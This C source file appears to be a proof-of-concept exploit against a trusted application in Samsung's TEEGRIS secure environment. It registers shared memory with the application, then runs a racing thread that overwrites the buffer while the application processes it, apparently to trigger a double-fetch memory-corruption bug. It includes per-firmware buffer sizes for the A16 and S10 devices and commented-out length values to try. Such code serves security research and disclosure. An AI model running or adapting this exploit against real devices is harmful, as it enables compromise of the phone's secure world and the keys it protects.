#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>     
#include <pthread.h>
#include <sys/mman.h>   
#include <sys/types.h>  
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
	system("ipcrm -M 0x13337");
	system("ipcrm -M 0x13338");
	system("ipcrm -M 0x13339");
	system("ipcrm -M 0x1333a");
#endif
}

typedef struct bs{
    int* buf0;
    int* buf1;
} bs;

void* mod_thread(void* arrg){
    bs* bsss = (bs*) arrg;
    void* arg = (void*)bsss->buf0;
    void* arg2 = (void*)bsss->buf1;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(1, &set);
    while(1){
        strcpy(arg+0x8200c, "hello :)\x00");
        strcpy(arg2+0x8200c, "hello :)\x00");
        /*
        ((int*)arg)[0x1] = 0x800;
        ((int*)arg2)[0x1] = 0x800;
        ((int*)arg)[0x1] = 0x7fffffff;
        ((int*)arg2)[0x1] = 0x7fffffff;
        ((int*)arg)[0x1] = -1;
        ((int*)arg2)[0x1] = -1;
        ((int*)arg)[0x1] = 0x500000;
        ((int*)arg2)[0x1] = 0x500000;
        ((int*)arg)[0x1] = 0x10;
        ((int*)arg2)[0x1] = 0x10;
        */
    }
}

typedef struct pls{
    uint64_t a[3];
    uint64_t ptr;
}pls;

/* The size the TA accepts differs per firmware: 0x212214 on the A16 (whose TA
 * binary is in ../a16/), 0x212010 on the S10. Anything else is rejected with
 * TEEC_ERROR_SHORT_BUFFER before the TA touches the buffer, so it is the first
 * thing to vary on a new device. Override at run time: ./poc [size] [cmd]. */
static size_t buf_size = 0x212214;
static uint32_t cmd_id = 0x11;

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_WHOLE, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    char* buf = (char*)malloc(buf_size);
    TEEC_Result res; 
    memset(buf, 0, buf_size);
  
    TEEC_SharedMemory in_mem;
    in_mem.buffer = buf;
    in_mem.size = buf_size;
    in_mem.flags = TEEC_MEM_INPUT| TEEC_MEM_OUTPUT;
    res = TEEC_RegisterSharedMemory_impl(context, &in_mem);
    if (res != TEEC_SUCCESS) {
        printf("Failed to register shared memory 1 %d\n", res);
        exit(-1);
    }
    pls* wow = (pls*)&in_mem;
    pls* wow2 = (pls*)wow->ptr;
    void* shm = (void*)wow2->ptr;
    printf("shm ptr %p\n", shm);
 
    op.params[0].memref.parent = &in_mem;  // the keyblock buffer
    //op.params[0].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
    //op.params[0].tmpref.size =  0x1000; 
    //op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
    //op.params[1].tmpref.size =  0x1000; 
    uint32_t err_origin;

    pthread_t tid;
    bs someshit;
    someshit.buf0 = (int*)shm;
    someshit.buf1 = (int*)buf;
    if (pthread_create(&tid, NULL, mod_thread, &someshit) != 0) {
        perror("pthread_create failed");
        return;
    }
    res = TEEC_InvokeCommand_impl(session, cmd_id, &op, &err_origin);
    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    if (argc > 1) buf_size = (size_t)strtoull(argv[1], NULL, 0);
    if (argc > 2) cmd_id = (uint32_t)strtoul(argv[2], NULL, 0);
    printf("buf_size 0x%zx cmd 0x%x\n", buf_size, cmd_id);

    char* ta = "00000000-0000-0000-0000-5345435f4652";
    TEEC_UUID *uuid = teegris_uuid(ta); 

    uint32_t err_origin;
    TEEC_Result res;
	TEEC_Context context;
    TEEC_Session session;

    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    send_req(&context, &session);
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
